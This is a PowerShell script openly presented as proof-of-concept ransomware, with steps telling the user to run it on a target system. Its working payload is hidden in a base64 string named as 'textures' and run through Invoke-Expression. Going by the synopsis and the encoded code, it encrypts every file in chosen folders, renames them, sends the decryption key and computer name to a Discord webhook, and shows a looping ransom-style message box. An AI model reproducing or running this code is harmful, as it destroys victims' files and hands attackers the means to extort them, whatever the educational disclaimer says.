<#=================================================== Beigeworm's File Encryptor (Base64) =======================================================

SYNOPSIS
This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
with a notice to the user.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

THIS IS EFFECTIVELY RANSOMWARE - I CANNOT TAKE RESPONSIBILITY FOR LOST FILES!
DO NOT USE THIS ON ANY CRITICAL SYSTEMS OR SYSTEMS WITHOUT PERMISSION
THIS IS A PROOF OF CONCEPT TO WRITE RANSOMWARE IN POWERSHELL AND IS FOR EDUCATIONAL PURPOSES

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Enter your webhook below. (if not pre-defined in a stager file or duckyscript etc)
2. Run the script on target system.
3. Check Discord for the Decryption Key.
4. Use the decryptor to decrypt the files.

CREDIT
Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
https://youtu.be/IwfoHN2dWeE
#>

$dc = 'YOUR_WEBHOOK_HERE' # (Remove this line if $dc is pre-defined elseware)
$textures = "JEhvc3QuVUkuUmF3VUkuQmFja2dyb3VuZENvbG9yID0gIkJsYWNrIg0KQ2xlYXItSG9zdA0KW0NvbnNvbGVdOjpTZXRXaW5kb3dTaXplKDEsIDEpDQpbQ29uc29sZV06OlNldFdpbmRvd1Bvc2l0aW9uKDEwMDAwLCAxMDAwMCkNCg0KJHdodXJpID0gIiRkYyINCiRTb3VyY2VGb2xkZXIgPSAiLlxmb2xkZXIiLCIuXGZvbGRlcjIiDQokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRTb3VyY2VGb2xkZXIgLUZpbGUgLVJlY3Vyc2UNCg0KJGluZGljYXRvciA9ICIkZW52OnRtcC9pbmRpY2F0ZSINCmlmICghKFRlc3QtUGF0aCAtUGF0aCAkaW5kaWNhdG9yKSl7DQoiaW5kaWNhdGUiIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRpbmRpY2F0b3IgLUFwcGVuZA0KfWVsc2V7ZXhpdH0NCg0KJEN1c3RvbUlWID0gJ3I3U2JUZmZUTWJNQTRabTcwaUhBd0E9PScNCiRLZXkgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQ0KJEtleS5HZW5lcmF0ZUtleSgpDQokSVZCeXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEN1c3RvbUlWKQ0KJEtleS5JViA9ICRJVkJ5dGVzDQokS2V5Qnl0ZXMgPSAkS2V5LktleQ0KJEtleVN0cmluZyA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRLZXlCeXRlcykNCg0KIkRlY3J5cHRpb24gS2V5OiAkS2V5U3RyaW5nIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkZW52OnRtcC9rZXkubG9nIC1BcHBlbmQNCg0KJGJvZHkgPSBAeyJ1c2VybmFtZSIgPSAiJGVudjpDT01QVVRFUk5BTUUiIDsiY29udGVudCIgPSAiRGVjcnlwdGlvbiBLZXk6ICRLZXlTdHJpbmcifSB8IENvbnZlcnRUby1Kc29uDQoNCklSTSAtVXJpICR3aHVyaSAtTWV0aG9kIFBvc3QgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIiAtQm9keSAkYm9keQ0KDQpHZXQtQ2hpbGRJdGVtIC1QYXRoICRTb3VyY2VGb2xkZXIgLUZpbGUgLVJlY3Vyc2UgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgJEZpbGUgPSAkXw0KICAgICRFbmNyeXB0b3IgPSAkS2V5LkNyZWF0ZUVuY3J5cHRvcigpDQogICAgJENvbnRlbnQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJEZpbGUuRnVsbE5hbWUpDQogICAgJEVuY3J5cHRlZENvbnRlbnQgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJENvbnRlbnQsIDAsICRDb250ZW50Lkxlbmd0aCkNCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRGaWxlLkZ1bGxOYW1lLCAkRW5jcnlwdGVkQ29udGVudCkNCn0NCg0KZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7DQogICAgJG5ld05hbWUgPSAkZmlsZS5OYW1lICsgIi5lbmMiDQogICAgJG5ld1BhdGggPSBKb2luLVBhdGggLVBhdGggJFNvdXJjZUZvbGRlciAtQ2hpbGRQYXRoICRuZXdOYW1lDQogICAgUmVuYW1lLUl0ZW0gLVBhdGggJGZpbGUuRnVsbE5hbWUgLU5ld05hbWUgJG5ld05hbWUNCn0NCg0KJHRvVmJzID0gQCcNCkRvIDogTXNnQm94IHZiQ3JMZiAmICJIZWxsbyBVc2VyISBZb3VyIEZpbGVzIEhhdmUgQmVlbiBFTkNSWVBURUQuIiAmIHZiQ3JMZiAmIHZiQ3JMZiAmIHZiQ3JMZiAmIHZiQ3JMZiAmIHZiQ3JMZiAmIHZiQ3JMZiAmICJSdW4gdGhlIERlY3J5cHRvciBzY3JpcHQgYW5kIGVudGVyIHRoZSBrZXkgdG8gcmVjb3ZlciBmaWxlcyIgJiB2YkNyTGYgJiB2YkNyTGYgJiB2YkNyTGYgJiB2YkNyTGYgJiB2YkNyTGYgJiB2YkNyTGYgJiAiWW91IGNhbiBjbG9zZSB0aGlzIHdpbmRvdyB3aGVuIERlY3J5cHRpb24gaXMgY29tcGxldGUiICYgdmJDckxmICYgdmJDckxmLCB2YkluZm9ybWF0aW9uLCAiKipPSCBOTyEgWW91ciBGaWxlcyBhcmUgRU5DUllQVEVEKioiIDogTG9vcA0KDQonQA0KJFZic1BhdGggPSAiJGVudjp0bXBcdi52YnMiDQokVG9WYnMgfCBPdXQtRmlsZSAtRmlsZVBhdGggJFZic1BhdGggLUZvcmNlDQomICRWYnNQYXRoDQpzbGVlcCAxDQpybSAtUGF0aCAkVmJzUGF0aCAtRm9yY2UNCg=="
$loadTextures = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($textures))
Invoke-Expression $loadTextures
